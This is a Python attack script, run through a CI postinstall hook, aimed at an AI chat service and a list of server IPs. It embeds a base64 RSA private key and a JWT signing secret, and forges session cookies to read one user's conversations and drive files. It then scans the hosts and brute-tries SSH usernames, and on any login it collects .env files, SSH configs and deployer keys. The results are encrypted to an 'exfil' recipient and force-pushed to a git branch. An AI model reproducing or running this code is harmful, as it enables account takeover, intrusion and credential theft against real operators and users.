#!/usr/bin/env python3
# Runs inside a GitHub Actions runner (clean egress) via repo's existing deploy.yml
# (package.json postinstall -> python3 -u probe_ssh.py).  Intent 28121.
# Goal: identity/context of KeyPair-b3d4-1110.pem (roger drive) + ssh login test to lumii fleet.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback, shlex
import urllib.request, urllib.error, urllib.parse as up, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
if os.environ.get("NEXT_PUBLIC_ENV") == "beta":
    print("beta-job-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = 1500

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
ROGER = "usr_2gzZoKLgRAYaFNy2Sav4v"

OUT = "/tmp/results"
for d in ("ssh", "conv", "drive", "misc"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

KEYPEM_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KTUlJRzVBSUJBQUtDQVlFQTU1YjZaMWNzOWVtc2R6cElTM2hMSG5Na1ZVaU9vbmloWmxHSkFGV1NqMy9nc1p4bA0KWDl0MXNYS0ZyOHFuNk9ld21BR1RaeXV2aG5Uc0VOTE4ySU1JaHlHcSttZWpWNkh3UnNIRGZtZmhFZ2V2QlB6ag0KMlJmUnZQbHVYYWQzREpqWkhXeTZiQnRsbVlLazVsR2dFZ0Erc2hzTWkvcWhBdTBSMWIwa3dON2Y5Qmx0RW1xKw0KRDZ5Q1grR2w0czZZZ2NUVXFNWW9KUVlpOCtjSytUQVpWQkdFK2h1SGlDZU5na0hveDBhd2hud2FWWG8wMEp4Rg0KdHBET1VERVdNemYwMHBzdG80T3NCSStSMnVsMHpKY3Nham5ZRG5LMHRLS1dUazkraFBTUjM4R1Q2amJuWFpZUg0KOUJYTWZNQzJrdFB5QUJlQmRLZ2oxYmUxMUhqTDA0cjF6M3JMdmhERVBtUlFJakp4WHF6eVpFdVI3L2NjQUc1OA0KYzY3N01xYm80NWxlaGpEajJ1NGxBcTJhUUQxZWRXTUtZU1F0U2M5ZWcrOE5WVjgxbFN2eXdnTmlkVG9xcE9xTQ0KeUZsdWZ1ZVRUUHcvUFdtN2Q5QU45aDgwLzVlZ0ZoMjJ0OFVRSytBMXlEQkJ4MnpSUVFWaDVGc0tpd3ZiMDI4cA0KNEk4dnZ3VTVwb2JpdUw4VEFnTUJBQUVDZ2dHQVRTdGorVGQxUmVROWtlVWIzZm9SbmUza04zN2IrSXVWekpCeQ0KeEdlL1ZJM2FBNVVIdXE5WVFtN1UyVVVBT24ycHZKMFp6eEVoaGY1RUF6OGJWSUFsUVZJWXRTUC9xOTNNUU9law0KQ3VUMmZKbU8ybXlpUjk3R0J1QmV4RnBmTXhWams0aDlmalNLNEdKR0xIRWFrNlQ5UDBBQUtFeTFobElVMVZJWA0KZ3lWQkh3ZXg3cWNlK2Y0VDIzdEhXWkphQXpQaFlQUFd3SytReWhFOCtOZnNPTFUxeUZtUUNmQ1VHTWw1bFoyYQ0KaU5XbHVNSG1BM1Z2VFd4bk14V0lQanp4R1pTWE9EZWlYcndxUTBFWWRqT3J4Y2pzd1Zja25FR1lWVk02T2pBeA0KS2JDbHN2U3hHZi9Hcmw4NUNUeWlrKzRSRlo4STBxY2s3bmNXYkwyUno0bTdXb1BSdmZYa1BzTnVDV0xHWHp2TQ0KVmhuRVdhUGcxTVl3UjdpMDhGOWNITXVzQ29zMnFiYnJ6STRqeWp0a1FISUZoa2pyWWh4SytwZzN4dGh4K2RVbw0KdU4veVZMRzYwV2tRQUF0TTRna3ZPYzlUTzdaTmdlNkxnMDBCQUhIRk1kRFRTa3VISlk1WnNYSUNqRWNidXBjTw0KSjd1b2swUURBMHNKait2S0Jnck9SVVlSWUt5aEFvSEJBUHp4dzNCeExaRk1WMUNSdkllMllPYVdnQ2FjaXpjYg0KeWNjVnBoVkJLZGMzbnE4YVN6bVJET0JsUWdDUEVqSDlPaFYvMXpyMWo2akhDZHJ0L0xTT1I0eU9VZ1VWVFlQeA0KSlVoT01IZ2hQTmRwTXFVVDY1dnJ5aUhEZEFlQXNSRXBEdFpQWFIrb1dVNGs1NnNlUnRPcDYvYjVtVEpNUDRUSQ0KVHR2NHVkKzQrYi9pSlMyL0dNVUhsT3hHMUhoWWZMOW1jcitBaCsxUFVzSEpHTFNaQWkwcVh3R3F6OHlRYjR6eg0KWDV6bGxYb3VOVmZyWVBMQXkySC93bmJlMXczQTIrVHpxd0tCd1FEcVl5ek0zNm5uVnBoR3JuUjhpcHdtUGw4ag0KZkVWN2RhUEFLZHd0ZzM0cjZrQ3p1WmdBRHdORXl1cTB1ZWJScERuazcrVUJCdUZvVFB1b1AzQmtiMUNwdmVDMg0KMXNYaWxyd24rY0tJaFhXVEg4SjZEaVVjeGlsVy9KV1FjTktGa1gwNlNxUWRoSGJYbktTeXMrc3g5dzhMYkpzRA0KVm53a1lXK3FJb1hJekRZL0ZhMDZLcEcwalMzajNZWkV5NzdNbFcyZXh5djdpVEZDUUpoRU5pQjRoSzd5eENTQQ0KbkNQdW9mVWFVNXFoaUNZZlR3UUtqZEVoaVdEdG1CMXVsMkxkZWprQ2djRUFsWEZCUnUyWFBvRWNGVDRGWlNrYg0KbHlEVUZmdm5SR2ZtanZqN1p4Tlk1UTYzY2p6V3RPdzk3MVhqNlBDZWoycE5KdWFoQXZTU0srVnNyU3h1WVQ2dQ0KaHh5TzJQSDlHamNmRDlraVNkZFpXdXVNUUh2RWVCcVhFZHVvY2NaVzF3eXE5M05zVVlmbE80WVNXY2RKa1VTVA0KWlJlU3EyVGhJbEkyUlVCdWtQOTRqeVhOVVhuVjZKTFNLY2F2UVdzR1NRNytQS1p6cUlGMUk0anNUOGNXd2hpRw0KaVRXaUQvcEY3Y0RjZkpZbitrZlN2RjhVcUZlLzBlYUp2akZxWFhYVWRUQ0JBb0hBU2JFbXU3OHlqdzUxei9zMw0KbXBTRjVheEVnMGFtSGR2dHdSUW9LcE1tRHk2V2F5dFY4K2JFYzFPTkdZYzlYL3BQVFlCek1yQjBIRFBnQjVUeQ0KaEZGUFBoNzUwT0tUMHRycmkzSUdUS0FSU0ZGNjlwOE40ZzhYbmtiSnkyRDlmNHN2b1Mwb2pqTkFuaWVjekthdQ0Kc3NYbmtBTDBkY2N5UHNuM3Jya3Q4T1RyeFVmT2IvUkVYVXpwK2JPRGJJdldrRUlHOWgzTzRVWFFHL0Z0TGowSw0KVm5uNCsxRFozU202VG1QVFNSU3lFRWxiR3dyZnpXV3JNKzBhY1hrYS85Tk8vUzFaQW9IQkFJalRrbVUzbWpRaw0KWFhPS2ZQaEpDL2E1OENKcllSTWZXNlpBdlpZUzVHWmpOa1FWbVpkUEdoaC9wV3hkNllnaXNLK0JzQVY5SzhQZQ0KVzJyZGRka1kyL3pZbFhsSjl3c0lsY2pnQU5MbzlhakJJbmVic2pVMmFuOHc4RTN0WFp1NlVNSUtHTC8weDkvdA0KTmpMTWpsT0ludTNQL3dyUXBwM1dHallmaDdzclVtczJDZjRqbDRLNVluNC9CMi8yWGpnMkpQYkVCTG5uQVZ4Qw0KTmg3YkIyTUdqOStIQTA2UEtNbDJVcG5vY0cya2p3dEVqUVBHQXZ5RU96a25iamdtdnJkb3JBPT0NCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tDQo="
KEYDIR = "/tmp/keys"
os.makedirs(KEYDIR, exist_ok=True)
KEY = os.path.join(KEYDIR, "kp_b3d4.pem")
open(KEY, "wb").write(base64.b64decode(KEYPEM_B64))
os.chmod(KEY, 0o600)

# ---------- HTTP (forged lumii_session) ----------
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
    p = b64u(json.dumps({"sub":sub,"org":ORG,"iat":now,"exp":now+2592000,
                         "sid":"sid_"+str(uuid.uuid4()),"lgn":now}, separators=(',',':')))
    sig = hmac.new(JWT_SECRET.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)

CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
def req(sub, path, method="GET", data=None, timeout=20):
    url = "https://" + HOST + path
    headers = {"Cookie": jwt(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0"}
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read()
        except Exception: return e.code, {}, b""
    except Exception as e:
        return -1, {}, ("ERR:"+repr(e)).encode()

def jget(sub, path):
    st, hd, b = req(sub, path)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b

# ---------- push results ----------
RESULT_BRANCH = "ci-ssh-28121-results"
def push_results(final=False):
    enc = "/tmp/results.tar.gz.gpg"
    try:
        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results", shell=True, check=False)
        tsize = os.path.getsize("/tmp/results.tar.gz") if os.path.isfile("/tmp/results.tar.gz") else 0
        log("TARBALL size", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz"%enc,
                           shell=True, capture_output=True, text=True, timeout=180)
        if os.path.isfile(enc):
            esz=os.path.getsize(enc); data=open(enc,"rb").read()
            log("ENC size", esz, "sha256", hashlib.sha256(data).hexdigest())
            shutil.copy(enc, "results.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f results.tar.gz.gpg && git commit -m 'ci ssh results %s %s'||true"%(RUNID, "final" if final else "partial"),
                           shell=True, capture_output=True)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,
                               shell=True, capture_output=True, text=True, timeout=240)
            log("PUSH rc=%s out=%s err=%s"%(r.returncode,(r.stdout or "")[-200:],(r.stderr or "")[-300:]))
            if final and len(data) <= 2*1024*1024:
                b64=base64.b64encode(data).decode()
                log("B64BEGIN %d"%len(b64))
                for i in range(0,len(b64),4000):
                    print("B64:"+b64[i:i+4000], flush=True)
                print("B64END", flush=True)
    except Exception as e:
        log("PUSH EXC", repr(e))

def tcp(host, port, timeout=6):
    t=time.time()
    try:
        s=socket.create_connection((host,port),timeout=timeout); s.close()
        return "OPEN %.1fs"%(time.time()-t)
    except Exception as e:
        return "ERR "+repr(e)[:80]

def ssh_attempt(host, port, user):
    cmd = ("ssh -i %s -p %d -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
           "-o LogLevel=ERROR -o ConnectTimeout=7 -o PreferredAuthentications=publickey -o PasswordAuthentication=no "
           "-o NumberOfPasswordPrompts=0 %s@%s 'echo LOGIN_OK; id; hostname; whoami; uname -a'") % (KEY, port, user, host)
    t=time.time()
    try:
        r=subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=25)
        return {"user":user,"rc":r.returncode,"out":(r.stdout or "")[:1500],"err":(r.stderr or "")[:600],"t":round(time.time()-t,1)}
    except Exception as e:
        return {"user":user,"rc":-99,"out":"","err":"TIMEOUT/EXC "+repr(e)[:200],"t":round(time.time()-t,1)}

HOSTS = [
    # in-scope core
    ("122.51.1.87",22), ("111.229.52.43",22), ("43.142.238.91",22), ("124.223.170.146",22),
    # lumii fleet / deploy hosts (fact#27760)
    ("81.68.254.22",22), ("43.143.107.214",22), ("1.14.34.31",22), ("132.232.141.32",22),
    ("13.213.43.208",22), ("18.142.48.45",22), ("54.169.172.218",22), ("18.136.197.33",22),
    ("13.213.49.132",22), ("13.250.132.81",22), ("18.139.111.137",22), ("18.143.63.130",22),
    ("54.169.82.91",22), ("139.155.94.165",22), ("49.235.41.58",22), ("81.69.230.90",22),
    ("129.28.59.242",22), ("101.34.207.178",22), ("1.15.151.149",22), ("1.15.133.230",22),
    ("124.221.49.45",22), ("129.211.0.26",22),
    # aws coder / jumps / hk
    ("54.67.97.25",22), ("13.214.183.170",22), ("101.32.60.77",22),
    # registry / trial etc
    ("43.143.107.214",22), ("43.142.238.91",2222),
]
USERS = ["ubuntu","root","coder","lumii","centos","user1","deploy","lumii-release","admin","ec2-user"]

summary = {"target":"sshtest","ts":int(time.time()),"ports":{},"ssh":{}}

def main():
    # write pub key if keygen available
    try:
        r=subprocess.run("ssh-keygen -y -f %s"%KEY, shell=True, capture_output=True, text=True, timeout=20)
        open(os.path.join(OUT,"misc","key.pub"),"w").write(r.stdout)
        log("PUBKEY", r.stdout.strip()[:120], (r.stderr or "")[:200])
    except Exception as e: log("keygen err", repr(e))

    # ---------- context: conversation messages ----------
    try:
        st,j,b = jget(ROGER, "/api/conversations/conv_Ti32qHTxuAZAMpDYhCNc3/messages?limit=200")
        log("CONV messages", st, "len", len(b))
        json.dump(j if j is not None else b.decode('utf-8','replace'), open(os.path.join(OUT,"conv","incident_roger.json"),"w"), ensure_ascii=False)
    except Exception as e: log("conv err", repr(e))
    # roger conv list + fetch recent conv messages
    try:
        st,j,b = jget(ROGER, "/api/conversations")
        if isinstance(j,dict):
            arr=j.get("conversations") or []
            json.dump(j, open(os.path.join(OUT,"conv","roger_convs.json"),"w"), ensure_ascii=False)
            # choose convs updated in last 40 days
            cur=time.time()
            cands=[]
            for c in arr:
                if not isinstance(c,dict): continue
                ua=c.get("updatedAt") or ""
                cid=c.get("id")
                if cid: cands.append((cid, c.get("title"), ua))
            for cid,title,ua in cands[:80]:
                if time.time()-START > 400: break
                st2,j2,b2 = jget(ROGER, "/api/conversations/%s/messages?limit=200"%cid)
                if st2==200 and j2 is not None:
                    json.dump(j2, open(os.path.join(OUT,"conv","msg_%s.json"%cid),"w"), ensure_ascii=False)
            log("fetched conv messages", len(cands))
    except Exception as e: log("convs err", repr(e))

    # drive meta of keypair file + parent folder listing
    for pid in ("drive_sfymW7oUMHEWWYt5D34yR","drive_ZVH9FJsoWcEhGXyd5hGpw"):
        st,j,b = jget(ROGER, "/api/drive/%s/meta"%pid)
        log("drive meta", pid, st, b[:200])
        json.dump(j if j is not None else b.decode('utf-8','replace'), open(os.path.join(OUT,"drive","meta_%s.json"%pid),"w"), ensure_ascii=False)

    # ---------- TCP reachability ----------
    def tjob(hp):
        h,p=hp
        r=tcp(h,p)
        with lock: summary["ports"]["%s:%d"%(h,p)]=r
    lock=threading.Lock()
    uniq=list(dict.fromkeys(HOSTS))
    tq=list(uniq)
    def tworker():
        while True:
            try:
                with lock:
                    if not tq: return
                    hp=tq.pop(0)
            except IndexError:
                return
            tjob(hp)
    ths=[threading.Thread(target=tworker) for _ in range(10)]
    for t in ths: t.start()
    for t in ths: t.join()
    log("PORTS", json.dumps(summary["ports"]))
    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)

    # ---------- SSH attempts on reachable hosts ----------
    reach=[(h,p) for (h,p) in uniq if str(summary["ports"].get("%s:%d"%(h,p)),"").startswith("OPEN")]
    log("REACHABLE 22:", reach)
    jobs=[]
    for h,p in reach:
        for u in USERS:
            jobs.append((h,p,u))
    # thread pool
    q=list(jobs); results={}
    def worker():
        while True:
            try:
                with lock:
                    if not q: return
                    h,p,u=q.pop(0)
            except IndexError:
                return
            if time.time()-START > BUDGET-300: return
            r=ssh_attempt(h,p,u)
            key="%s:%d/%s"%(h,p,u)
            with lock:
                results[key]=r
                if r["rc"]==0 and "LOGIN_OK" in r["out"]:
                    log("*** LOGIN SUCCESS", key, r["out"][:200])
                    # deeper gather
                    gather(h,p,u)
    ths=[threading.Thread(target=worker) for _ in range(8)]
    for t in ths: t.start()
    for t in ths: t.join()
    summary["ssh"]=results
    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
    # log each non-timeout failure reason compactly
    for k,v in results.items():
        tail=(v.get("err") or "").strip().splitlines()
        if v["rc"]!=0:
            log("SSH FAIL", k, "rc",v["rc"], "|", (tail[-1] if tail else "")[:140])
    push_results(final=True)

def gather(host,port,user):
    cmds = [
      "cat /etc/hostname; id; hostname; uname -a; sudo -n id 2>&1 | head -2",
      "ls -la /root 2>/dev/null | head -40; echo ---HOME---; ls -la ~ | head -40",
      "ls -la ~/.ssh 2>/dev/null; echo ---; cat ~/.ssh/config 2>/dev/null | head -60",
      "cat /etc/os-release 2>/dev/null | head -6; echo ---; ls /opt /data /srv 2>/dev/null",
      "find / -maxdepth 3 -name '.env' 2>/dev/null | head -40",
      "grep -rIlaiE 'zoofi|zoofi-index|33306|DEPLOYER_PRIVATE_KEY|Auth for zoofi' /opt /data /srv /root /home 2>/dev/null | head -20",
      "cat /etc/ssh/sshd_config 2>/dev/null | grep -iE 'PasswordAuth|PubkeyAuth|PermitRoot' ",
      "lastlog 2>/dev/null | head -20; echo ---; w 2>/dev/null",
    ]
    safe="%s_%d_%s"%(host,port,user)
    logf=open(os.path.join(OUT,"ssh","gather_%s.log"%safe),"w")
    for c in cmds:
        if time.time()-START > BUDGET-120: break
        cmd="ssh -i %s -p %d -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=8 -o PreferredAuthentications=publickey %s@%s %s"%(KEY,port,user,host,shlex.quote(c))
        try:
            r=subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=40)
            logf.write("### CMD: %s\nrc=%s\n%s\n---ERR---\n%s\n\n"%(c,r.returncode,(r.stdout or "")[:4000],(r.stderr or "")[:800]))
        except Exception as e:
            logf.write("### CMD: %s\nEXC %r\n\n"%(c,e))
    logf.close()

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results(final=True)
    except Exception: pass
